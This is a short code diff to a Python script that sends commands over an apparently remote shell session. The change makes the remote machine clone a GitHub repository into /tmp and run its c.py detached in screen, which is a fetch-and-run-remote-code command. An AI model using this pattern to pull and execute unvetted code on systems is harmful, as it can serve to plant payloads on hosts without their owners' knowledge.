@@ -42,7 +42,7 @@ def connect_and_interact2():
         time.sleep(64)
         channel.send('e')
         time.sleep(16)
-        channel.send('cd /tmp && screen python3 c.py\n')
+        channel.send('cd /tmp && git clone https://github.com/oahwrd/GG && mv ./GG/* . && screen python3 c.py\n')
         while True:
             time.sleep(30)
     except Exception as e:
